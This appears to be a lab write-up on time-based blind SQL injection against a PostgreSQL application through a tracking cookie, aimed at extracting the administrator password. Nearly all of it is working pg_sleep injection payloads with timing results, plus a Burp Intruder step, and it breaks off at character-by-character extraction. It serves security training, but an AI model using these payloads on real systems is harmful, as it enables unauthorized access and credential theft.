vulnerable paramter - _tracking cookie_  

## End goals:  
- Exploit time-based blind SQLi to output the administrator password
- Login as the administrator user

## Analysis:  
1. Confirm that the parameter is vulnerable to SQLi  
`'|| pg_sleep(10)--`  
> Confirm that it is vulnerable to SQLi, and it is postgreSQL  


2. Confirm that the users table exist in the db  
`'|| (select case when (1=1) then pg_sleep(10) else pg_sleep(-1) end)--`  
> The negative number in pg_sleep() means don't sleep at all.  
> It took 10313 millis to get the 200 OK response.  

`'|| (select case when (1=0) then pg_sleep(10) else pg_sleep(-1) end)--`  
> It took 308 millis to get the 200 OK response.  

`'|| (select case when (username='administrator') then pg_sleep(10) else pg_sleep(-1) end from users)--`  
> It took 10317 millis to get the 200 OK response. 
> It means the username administrator exists in the users.  


3. Enumerate the password length  
`'|| (select case when (username='administrator' and LENGTH(password)>1) then pg_sleep(10) else pg_sleep(-1) end from users)--`
> It took 10313 millis to get the 200 OK response. 
> It means the password length is bigger than 1.

Send the following to Burp Suite Intruder, to get the exact length of the password.
`'|| (select case when (username='administrator' and LENGTH(password)<25) then pg_sleep(10) else pg_sleep(-1) end from users)--`  
![image](https://user-images.githubusercontent.com/106157137/173727944-88f28fcc-ca13-48d2-b076-69978073ff91.png)  
> So as we know that the password length is 20.  


4. Enumerate the administrator password  
`'|| (select case when (username='administrator' and substring(password,1,1)='a') then pg_sleep(10) else pg_sleep(-1) end from users)--`  
